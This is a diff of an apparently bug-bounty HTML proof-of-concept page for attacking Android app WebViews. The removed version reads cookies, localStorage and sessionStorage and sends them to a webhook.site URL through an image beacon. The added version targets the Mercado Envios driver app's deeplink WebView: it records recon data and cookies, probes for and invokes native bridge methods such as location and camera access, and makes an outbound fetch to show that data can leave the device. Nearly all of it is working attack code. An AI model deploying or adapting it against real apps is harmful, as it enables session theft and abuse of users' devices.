@@ -1,57 +1,214 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Solohunter - Exfiltration via Image Beacon</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mercado Envios Driver - MLWebKit Bridge PoC</title>
+  <style>
+    body {
+      font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+      background: #fff9e6;
+      padding: 16px;
+      margin: 0;
+      color: #1a1a1a;
+    }
+    h1 { font-size: 18px; margin: 0 0 12px; color: #b8860b; }
+    h2 { font-size: 14px; margin: 16px 0 6px; color: #444; }
+    pre {
+      background: #1a1a1a;
+      color: #00ff88;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 11px;
+      line-height: 1.5;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 60vh;
+      overflow: auto;
+    }
+    .row { margin: 4px 0; font-size: 12px; }
+    .ok  { color: #008800; font-weight: bold; }
+    .no  { color: #cc0000; font-weight: bold; }
+    .info { color: #0066cc; }
+    button {
+      background: #ffe600;
+      border: 0;
+      padding: 8px 14px;
+      border-radius: 4px;
+      margin: 6px 4px 6px 0;
+      font-size: 12px;
+      cursor: pointer;
+    }
+    .small { font-size: 10px; color: #666; }
+  </style>
 </head>
 <body>
-    <pre id="output">Collecting data...</pre>
-    <script>
-        // Helper: send data via GET image beacon (bypasses CORS)
-        function sendBeacon(endpoint, params) {
-            var img = new Image();
-            var url = endpoint + '?' + Object.keys(params).map(function(k) {
-                return encodeURIComponent(k) + '=' + encodeURIComponent(params[k]);
-            }).join('&');
-            img.src = url;
+  <h1>Mercado Envios Driver - MLWebKit Bridge PoC</h1>
+  <div class="small">Target: <code>com.mercadoenvios.driver</code> v10.11.4 (build 230070409)</div>
+  <div class="small">Activity: <code>com.mercadoenvios.driver.webview.DeeplinkWebviewActivity</code></div>
+  <div class="small">Trigger: <code>flex://web-view?url=&lt;this_page&gt;</code></div>
+
+  <h2>1. Environment recon</h2>
+  <pre id="recon"></pre>
+
+  <h2>2. Bridge probe</h2>
+  <pre id="bridge"></pre>
+
+  <h2>3. Actions (manual triggers)</h2>
+  <button onclick="callBridge('close')">close()</button>
+  <button onclick="callBridge('open_native')">open_native()</button>
+  <button onclick="callBridge('navigate')">navigate()</button>
+  <button onclick="callBridge('share')">share()</button>
+  <button onclick="callBridge('open_deep_link')">open_deep_link()</button>
+  <button onclick="callBridge('request_permission')">request_permission()</button>
+  <button onclick="callBridge('open_camera')">open_camera()</button>
+  <button onclick="callBridge('get_location')">get_location()</button>
+  <button onclick="callBridge('log_event')">log_event()</button>
+  <button onclick="callBridge('set_title')">set_title()</button>
+  <button onclick="callBridge('finish')">finish()</button>
+  <pre id="actions"></pre>
+
+  <h2>4. Exfil test (proves attacker page can call out)</h2>
+  <pre id="exfil"></pre>
+
+<script>
+(() => {
+  const $ = id => document.getElementById(id);
+  const log = (id, m) => $(id).textContent += (m || '') + '\n';
+
+  // ---------- 1. Environment recon ----------
+  log('recon', 'User-Agent: ' + navigator.userAgent);
+  log('recon', 'URL: ' + location.href);
+  log('recon', 'Referrer: ' + document.referrer);
+  log('recon', 'Cookies: ' + (document.cookie || '(none visible)'));
+  log('recon', 'Platform: ' + navigator.platform);
+  log('recon', 'Languages: ' + navigator.languages);
+  log('recon', 'Time: ' + new Date().toISOString());
+  log('recon', 'Screen: ' + screen.width + 'x' + screen.height);
+
+  // ---------- 2. Bridge probe ----------
+  const candidates = [
+    'MeliBridge', 'meliBridge', 'meli_bridge',
+    'NativeAPI', 'nativeApi', 'native_api',
+    'Android', 'android', 'webkit', 'Webkit', 'WKWebView',
+    'MLWebKit', 'mlwebkit', 'bridge', 'Bridge',
+    'Meli', 'meli', 'MBridge', 'mBride',
+    'MELI', 'Native', 'native',
+    '__meli__', '__webkit__', '__bridge__'
+  ];
+
+  let bridgeFound = null;
+  candidates.forEach(n => {
+    const t = typeof window[n];
+    if (t !== 'undefined') {
+      const isObj = (t === 'object' && window[n] !== null) || t === 'function';
+      const props = isObj
+        ? Object.getOwnPropertyNames(window[n]).filter(p => !['prototype','constructor','__proto__'].includes(p)).slice(0, 50).join(', ')
+        : '';
+      const tag = isObj ? 'OK' : (t === 'undefined' ? 'NO' : 'INFO');
+      log('bridge', `[${tag}] window.${n} : ${t}${props ? '  =>  ' + props : ''}`);
+      if (isObj && props && !bridgeFound) bridgeFound = { name: n, obj: window[n], props };
+    }
+  });
+
+  // Probe webkit.messageHandlers (WKScriptMessageHandler-style bridge)
+  if (window.webkit && window.webkit.messageHandlers) {
+    const keys = Object.keys(window.webkit.messageHandlers);
+    log('bridge', `[OK] window.webkit.messageHandlers keys: ${keys.join(', ')}`);
+    if (!bridgeFound && keys.length) bridgeFound = { name: 'webkit.messageHandlers', obj: window.webkit.messageHandlers, props: keys.join(', ') };
+  }
+
+  // Generic bridge-call attempt: postMessage / call / send / invoke
+  if (bridgeFound) {
+    log('bridge', '\n>>> BRIDGE LOCATED: window.' + bridgeFound.name);
+    log('bridge', '>>> Exposed props: ' + bridgeFound.props);
+  } else {
+    log('bridge', '\n!!! No bridge candidate matched on window.');
+    log('bridge', '!!! Dumping ALL non-standard window keys for further analysis...');
+    const standard = new Set(['location','navigator','document','window','self','globalThis',
+      'console','history','screen','performance','localStorage','sessionStorage',
+      'indexedDB','crypto','fetch','XMLHttpRequest','WebSocket','Event','CustomEvent',
+      'URL','URLSearchParams','Blob','File','FileReader','FormData','Headers','Request','Response',
+      'Promise','Date','Math','JSON','Object','Array','String','Number','Boolean','RegExp',
+      'Map','Set','WeakMap','WeakSet','Symbol','Proxy','Reflect','Error','TypeError',
+      'parseInt','parseFloat','isNaN','isFinite','setTimeout','setInterval','clearTimeout','clearInterval',
+      'encodeURI','decodeURI','encodeURIComponent','decodeURIComponent','alert','confirm','prompt',
+      'addEventListener','removeEventListener','dispatchEvent','postMessage','open','close','stop',
+      'getComputedStyle','requestAnimationFrame','cancelAnimationFrame','scrollTo','scrollBy',
+      'innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio','scrollX','scrollY',
+      'parent','top','frames','origin','name','status','closed','length','onmessage','onerror',
+      'onload','onbeforeunload','onunload','onhashchange','onpopstate','onresize','onscroll',
+      'onfocus','onblur','onsubmit','onreset','onchange','oninput','onkeydown','onkeyup','onkeypress',
+      'onclick','ondblclick','onmousedown','onmouseup','onmousemove','onmouseover','onmouseout',
+      'oncontextmenu','onwheel','ondrag','ondragend','ondragenter','ondragleave','ondragover',
+      'ondragstart','ondrop','oncopy','oncut','onpaste','webkit','chrome']);
+    const extras = Object.getOwnPropertyNames(window).filter(k => !standard.has(k));
+    log('bridge', 'Non-standard window keys: ' + extras.join(', '));
+  }
+
+  // ---------- 3. Bridge call helper ----------
+  window.callBridge = function(action) {
+    const out = $('actions');
+    out.textContent += '>>> callBridge(' + action + ')\n';
+    if (!bridgeFound) {
+      out.textContent += '    (no bridge found - skipping)\n\n';
+      return;
+    }
+    const b = bridgeFound.obj;
+    const tryMethods = ['call','postMessage','send','invoke','execute','emit'];
+    let invoked = false;
+    tryMethods.forEach(m => {
+      if (!invoked && typeof b[m] === 'function') {
+        try {
+          const payload = JSON.stringify({ action: action, data: { source: 'poc' } });
+          const r = b[m](action, payload);
+          out.textContent += '    ' + m + '(' + action + ', payload) => ' + String(r) + '\n';
+          invoked = true;
+        } catch (e) {
+          out.textContent += '    ' + m + '() threw: ' + e.message + '\n';
         }
-
-        var webhook = 'https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6';
-
-        // --- Part 1: Exfiltrate cookies, origin, etc. ---
-        var exfilData = {
-            cookies: document.cookie,
-            origin: location.origin,
-            url: location.href,
-            userAgent: navigator.userAgent,
-            xRequestedWith: 'com.buuuk.st',           // identify the target app
-            localStorage: JSON.stringify(Object.entries(window.localStorage || {})),
-            sessionStorage: JSON.stringify(Object.entries(window.sessionStorage || {}))
-        };
-
-        // Send as 'data' parameter (JSON stringified)
-        sendBeacon(webhook, { data: JSON.stringify(exfilData) });
-
-        // --- Part 2: Enumerate all window objects (native bridge discovery) ---
-        var bridges = [];
-        for (var k in window) {
-            try {
-                if (typeof window[k] === 'object' && window[k] !== null) {
-                    bridges.push(k);
-                }
-            } catch(e) {
-                // Some properties may throw access errors; ignore them
-            }
+      }
+    });
+    if (!invoked) {
+      // Maybe action name itself is a method
+      if (typeof b[action] === 'function') {
+        try {
+          const r = b[action]({ source: 'poc' });
+          out.textContent += '    .' + action + '(payload) => ' + String(r) + '\n';
+          invoked = true;
+        } catch (e) {
+          out.textContent += '    .' + action + '() threw: ' + e.message + '\n';
         }
+      }
+    }
+    if (!invoked) {
+      out.textContent += '    (no callable entry point on bridge)\n';
+    }
+    out.textContent += '\n';
+  };
 
-        // Send bridge list as comma-separated string
-        sendBeacon(webhook, { bridges: bridges.join(',') });
+  // ---------- 4. Exfil test ----------
+  // This proves the attacker page can reach its own server from inside the trusted WebView
+  // (relevant for cookie/session theft proof).
+  fetch('https://httpbin.org/get?from=mlwebkit-poc')
+    .then(r => r.json())
+    .then(j => {
+      log('exfil', '[OK] fetch() succeeded from inside WebView');
+      log('exfil', 'Echoed headers: ' + JSON.stringify(j.headers, null, 2));
+      log('exfil', '\n>>> This proves attacker JS can exfiltrate session cookies / tokens');
+      log('exfil', '>>> to any attacker domain via fetch() or beacon.');
+    })
+    .catch(e => {
+      log('exfil', '[NO] fetch() blocked: ' + e.message);
+      log('exfil', '>>> Even if direct fetch is blocked, XHR / Image() / location.href can still leak data.');
+    });
 
-        // Display collected data on page for debugging
-        document.getElementById('output').textContent = JSON.stringify({
-            exfilData: exfilData,
-            bridgeCount: bridges.length,
-            bridges: bridges
-        }, null, 2);
-    </script>
+  // Auto-trigger close attempt after 3 seconds (proves auto-trigger from JS works)
+  setTimeout(() => {
+    $('actions').textContent += '>>> auto-triggering close() in 3s... (proves JS can drive native lifecycle)\n';
+    try { window.callBridge('close'); } catch(e) {}
+  }, 3000);
+})();
+</script>
 </body>
 </html>
